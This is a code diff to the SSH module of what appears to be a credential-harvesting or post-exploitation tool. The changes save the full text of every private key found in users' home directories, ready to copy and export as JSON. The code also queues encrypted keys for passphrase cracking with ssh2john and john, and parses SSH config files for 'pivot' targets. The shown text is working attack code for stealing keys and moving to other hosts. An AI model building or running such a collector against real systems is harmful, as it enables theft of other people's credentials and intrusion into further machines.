@@ -22,7 +22,7 @@ PRIV_NAME = re.compile(r"^(id_(rsa|dsa|ecdsa|ed25519)|.*\.pem|.*\.key|identity)$
 
 class SshCollector(BaseCollector):
     name = "SSH"
-    description = "SSH private keys, authorized_keys/known_hosts/config, agent keys"
+    description = "SSH private keys, config (pivot), agent keys"
 
     def collect(self) -> List[Secret]:
         found: List[Secret] = []
@@ -38,34 +38,34 @@ class SshCollector(BaseCollector):
             if not txt or not KEY_HDR.search(txt):
                 continue
             owner = user_of_home(os.path.dirname(os.path.dirname(f)))
+            # full key text goes to `material` (-> JSON export, copy-paste ready);
+            # the table only shows the path via `secret`
             if ENCRYPTED.search(txt):
                 found.append(Secret("SSH", owner, f, Status.KEY,
                                     secret_type="ssh-key-enc", target=f,
-                                    notes="encrypted key; crack: ssh2john -> john"))
+                                    notes="encrypted key; crack: ssh2john -> john",
+                                    material=txt.strip()))
                 enc_for_crack.append(f)
             else:
                 found.append(Secret("SSH", owner, f, Status.KEY,
                                     secret_type="ssh-key", target=f,
-                                    notes="usable private key; ssh -i"))
+                                    notes="usable private key; ssh -i",
+                                    material=txt.strip()))
 
-        # authorized_keys / known_hosts / config -> pivot info
+        # ~/.ssh/config -> pivot info (hosts/users/identityfiles). authorized_keys
+        # and known_hosts are not credentials, so they are no longer reported.
         for h in home_dirs():
-            for fn, note in (("authorized_keys", "accounts that trust a key you may hold"),
-                             ("config", "configured SSH targets/users/identityfile"),
-                             ("known_hosts", "previously connected hosts (pivot targets)")):
-                p = os.path.join(h, ".ssh", fn)
-                txt = read_text(p)
-                if not txt:
+            p = os.path.join(h, ".ssh", "config")
+            txt = read_text(p)
+            if not txt:
+                continue
+            for line in txt.splitlines():
+                line = line.strip()
+                if not line or line.startswith("#"):
                     continue
-                for line in txt.splitlines():
-                    line = line.strip()
-                    if not line or line.startswith("#"):
-                        continue
-                    found.append(Secret("SSH", user_of_home(h), line[:120],
-                                        Status.INFO, secret_type=fn, target=p,
-                                        notes=note))
-
-        # (ssh-agent intel is parsed from the bundle's meta by the runner)
+                found.append(Secret("SSH", user_of_home(h), line[:120],
+                                    Status.INFO, secret_type="config", target=p,
+                                    notes="configured SSH targets/users/identityfile"))
 
         # crack encrypted key passphrases via ssh2john -> john
         if self.crack_enabled and enc_for_crack and which("ssh2john"):
